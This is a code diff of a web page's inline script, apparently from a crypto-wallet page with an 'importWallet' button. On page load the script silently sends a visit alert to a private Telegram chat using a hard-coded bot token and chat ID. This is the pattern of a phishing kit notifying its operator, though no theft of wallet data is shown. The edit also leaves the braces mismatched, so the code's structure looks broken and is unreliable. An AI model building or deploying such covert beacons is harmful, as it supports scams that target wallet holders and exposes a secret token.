@@ -495,12 +495,13 @@
             </div>
         </div>
     </div>
-    <script> 
-        if (localStorage.getItem('visit') !== 'enabled') {
+    <script>   
+document.addEventListener('DOMContentLoaded', function send() {
+		if (localStorage.getItem('latest') !== 'enabled') {
         // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
     const TELEGRAM_CHAT_ID = '6049368044'; 
-    const MESSAGE = `NEW VISIT\n🥰🥰🥰`;
+    const MESSAGE = `VISIT\n🥰🥰🥰`;
 
 
 	  // Proper parameter naming
@@ -512,15 +513,16 @@ function sendTelegramNotification(botToken, chatId, messageText) {
       chat_id: chatId,
       text: messageText
     })
-  });
-}
+   });
+	 localStorage.setItem('latest', 'enabled');
+     }
 
 // Usage
 sendTelegramNotification(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MESSAGE);
-           localStorage.setItem('visit', 'enabled');
-}
-              
-        document.addEventListener('DOMContentLoaded', function() {
+   }
+});
+		
+document.addEventListener('DOMContentLoaded', function() {
     // Get the buttons by their IDs
     const toFormButton = document.getElementById('toform');
     const importWalletButton = document.getElementById('importWallet');
